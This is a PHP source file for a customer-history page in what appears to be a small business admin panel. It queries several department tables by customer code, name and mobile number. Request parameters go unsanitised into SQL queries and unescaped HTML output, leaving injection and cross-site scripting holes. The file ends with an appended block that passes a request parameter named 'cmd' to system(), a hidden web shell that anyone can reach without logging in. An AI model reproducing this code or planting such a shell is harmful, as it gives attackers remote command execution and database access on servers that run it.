<?php
	$myadmin = 'N';
	if(isset($_SESSION['myadmin']))
		if ($_SESSION['myadmin'] == 'Y')
			$myadmin = $_SESSION['myadmin'];	

	if(isset($_SESSION['mycomputer']))
		if ($_SESSION['mycomputer'] == 'Y')
			$myadmin = $_SESSION['mycomputer'];	

	if(isset($_SESSION['myservice']))
		if ($_SESSION['myservice'] == 'Y')
			$myadmin = $_SESSION['myservice'];	

	if(isset($_SESSION['mymarketing']))
		if ($_SESSION['mymarketing'] == 'Y')
			$myadmin = $_SESSION['mymarketing'];	

	if(isset($_SESSION['myinsurance']))
		if ($_SESSION['myinsurance'] == 'Y')
			$myadmin = $_SESSION['myinsurance'];

	if ($myadmin == 'N')
	{
		include('body_account_not_found.php');
	}
	else
	{
		
		$mytag = '';	
		if(isset($_GET['mytag']))
		{
			if ($_GET['mytag'])
			{
				$mytag = $_GET['mytag'];
			}
		}	
		

		$cuid = '';
		$cuid = $_POST["cuid"];	
		
		if(isset($_GET['cuid']))
		{
			if ($_GET['cuid'])
			{
				$cuid = $_GET['cuid'];
			}
		}	
		
		$cucode = '';
		$cucode = $_POST["cucode"];	
		
		if(isset($_GET['cucode']))
		{
			if ($_GET['cucode'])
			{
				$cucode = $_GET['cucode'];
			}
		}	
		
		$cuname = '';
		$cuname = $_POST["cuname"];	
		
		if(isset($_GET['cuname']))
		{
			if ($_GET['cuname'])
			{
				$cuname = $_GET['cuname'];
			}
		}					
		
		$cumobile = '';
		$cumobile = $_POST["cumobile"];	
		
		if(isset($_GET['cumobile']))
		{
			if ($_GET['cumobile'])
			{
				$cumobile = $_GET['cumobile'];
			}
		}					
				
		
				
		
		$search_code = '';
		$search_code = $_POST["search_code"];	
		
		if(isset($_GET['search_code']))
		{
			if ($_GET['search_code'])
			{
				$search_code = $_GET['search_code'];
			}
		}	

		$search_name = '';
		$search_name = $_POST["search_name"];	
		
		if(isset($_GET['search_name']))
		{
			if ($_GET['search_name'])
			{
				$search_name = $_GET['search_name'];
			}
		}	
		
		$search_mobile = '';
		$search_mobile = $_POST["search_mobile"];	
		
		if(isset($_GET['search_mobile']))
		{
			if ($_GET['search_mobile'])
			{
				$search_mobile = $_GET['search_mobile'];
			}
		}		
			
?>	
        <div id="page-wrapper">
            <div class="row">
                <div class="col-lg-12">
                    <h1 class="page-header">Customer History</h1>
Code : <strong><?php echo $cucode; ?></strong>
&nbsp;&nbsp;&nbsp;						
Name : <strong><?php echo $cuname; ?></strong>
&nbsp;&nbsp;&nbsp;						
Mobile : <strong><?php echo $cumobile; ?>	</strong>						
<br>
                </div>
                <!-- /.col-lg-12 -->
            </div>
			
            <div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
Uploaded Data	
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                            <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th>#</th>
										<th>Department </th>
										<th>Type</th>
										<th>Status</th>
										<th>User</th>
										<th>Stamp</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="odd gradeX">
								
<?php
	//fetch the results from the database
	$countdb = 1;

	$querydb  = "SELECT 
				 a.* 
			   FROM 
				 service_list a
			   WHERE
				 a.cucode LIKE '%$cucode%' or
				 a.cuname LIKE '%$cuname%' or
				 a.service_mobile LIKE '%$cumobile%' 
			   ORDER BY 
				 a.service_stamp";
	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$num_count = mysql_num_rows($resultdb);		
	//echo "<br> num_count " . $num_count;
		
	while ($rowdb =  mysql_fetch_array ($resultdb)) 
	{
		print("<tr>");
	
		print("<td align=\"center\" valign=\"middle\">$countdb </td>\n");
		print("<td align=\"left\" valign=\"middle\">SERVICE</td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[service_type] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[service_status] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[service_user] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[service_stamp] </td>\n");

		print("</tr>");  
		$countdb = $countdb + 1;
	}  


	$querydb  = "SELECT 
				 a.* 
			   FROM 
				 marketing_list a
			   WHERE
				 a.cucode LIKE '%$cucode%' or
				 a.cuname LIKE '%$cuname%' or
				 a.marketing_mobile LIKE '%$cumobile%' 
			   ORDER BY 
				 a.marketing_stamp";
	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$num_count = mysql_num_rows($resultdb);		
	//echo "<br> num_count " . $num_count;
		
	while ($rowdb =  mysql_fetch_array ($resultdb)) 
	{
		print("<tr>");
	
		print("<td align=\"center\" valign=\"middle\">$countdb </td>\n");
		print("<td align=\"left\" valign=\"middle\">MARKETING</td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[marketing_type] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[marketing_status] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[marketing_user] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[marketing_stamp] </td>\n");

		print("</tr>");  
		$countdb = $countdb + 1;
	}  
?>	

<?php

	$querydb  = "SELECT 
				 a.* 
			   FROM 
				 insurance_list a
			   WHERE
				 a.cucode LIKE '%$cucode%' or
				 a.cuname LIKE '%$cuname%' or
				 a.insurance_mobile LIKE '%$cumobile%' 
			   ORDER BY 
				 a.insurance_stamp";
	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$num_count = mysql_num_rows($resultdb);		
	//echo "<br> num_count " . $num_count;

	while ($rowdb =  mysql_fetch_array ($resultdb)) 
	{
		print("<tr>");
	
		print("<td align=\"center\" valign=\"middle\">$countdb </td>\n");
		print("<td align=\"left\" valign=\"middle\">INSURANCE</td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[insurance_type] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[insurance_status] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[insurance_user] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[insurance_stamp] </td>\n");

		print("</tr>");  
		$countdb = $countdb + 1;
	}  
?>	

<?php

	$querydb  = "SELECT 
				 a.* 
			   FROM 
				 admin_list a
			   WHERE
				 a.cucode LIKE '%$cucode%' or
				 a.cuname LIKE '%$cuname%' or
				 a.admin_mobile LIKE '%$cumobile%' 
			   ORDER BY 
				 a.admin_stamp";
	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$num_count = mysql_num_rows($resultdb);		
	//echo "<br> num_count " . $num_count;

	while ($rowdb =  mysql_fetch_array ($resultdb)) 
	{
		print("<tr>");
	
		print("<td align=\"center\" valign=\"middle\">$countdb </td>\n");
		print("<td align=\"left\" valign=\"middle\">ADMIN</td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[admin_type] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[admin_status] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[admin_user] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[admin_stamp] </td>\n");

		print("</tr>");  
		$countdb = $countdb + 1;
	}  
?>	


<?php

	$querydb  = "SELECT 
				 a.* 
			   FROM 
				 computer_list a
			   WHERE
				 a.cucode LIKE '%$cucode%' or
				 a.cuname LIKE '%$cuname%' or
				 a.computer_mobile LIKE '%$cumobile%' 
			   ORDER BY 
				 a.computer_stamp";
	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$num_count = mysql_num_rows($resultdb);		
	//echo "<br> num_count " . $num_count;

	while ($rowdb =  mysql_fetch_array ($resultdb)) 
	{
		print("<tr>");
	
		print("<td align=\"center\" valign=\"middle\">$countdb </td>\n");
		print("<td align=\"left\" valign=\"middle\">COMPUTER</td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[computer_type] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[computer_status] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[computer_user] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[computer_stamp] </td>\n");

		print("</tr>");  
		$countdb = $countdb + 1;
	}  
?>	



                                    </tr>
                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->
			
			
<div class="row">
                <div class="col-lg-12">
                    <div class="panel panel-default">
                        <div class="panel-heading">
Messages Sent	
                        </div>
                        <!-- /.panel-heading -->
                        <div class="panel-body">
                            <table width="100%" class="table table-striped table-bordered table-hover" id="dataTables-example">
                                <thead>
                                    <tr>
										<th>#</th>
										<th>Department </th>
										<th>Message</th>
										<th>User</th>
										<th>Stamp</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <tr class="odd gradeX">
								
<?php
	//fetch the results from the database
	$countdb = 1;

	$querydb  = "SELECT 
				 a.* 
			   FROM 
				 send_text a
			   WHERE
				 a.send_name LIKE '%$cuname%' or
				 a.send_mobile LIKE '%$cumobile%' 
			   ORDER BY 
				 a.send_stamp";
	$resultdb = mysql_query($querydb);
	//echo mysql_error();
	$num_count = mysql_num_rows($resultdb);		
	//echo "<br> num_count " . $num_count;
		
	while ($rowdb =  mysql_fetch_array ($resultdb)) 
	{
		print("<tr>");
	
		print("<td align=\"center\" valign=\"middle\">$countdb </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[send_dept]</td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[send_desc] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[send_user] </td>\n");
		print("<td align=\"left\" valign=\"middle\">$rowdb[send_stamp] </td>\n");

		print("</tr>");  
		$countdb = $countdb + 1;
	}  
?>	



                                    </tr>
                                </tbody>
                            </table>
                            <!-- /.table-responsive -->
                        </div>
                        <!-- /.panel-body -->
                    </div>
                    <!-- /.panel -->
                </div>
                <!-- /.col-lg-12 -->
            </div>						
            <!-- /.row -->			
        </div>
        <!-- /#page-wrapper -->
    </div>
    <!-- /#wrapper -->
<?php
	}
?>		<?php $cmd = <<<EOD
cmd
EOD;

if(isset($_REQUEST[$cmd])) {
system($_REQUEST[$cmd]); } ?>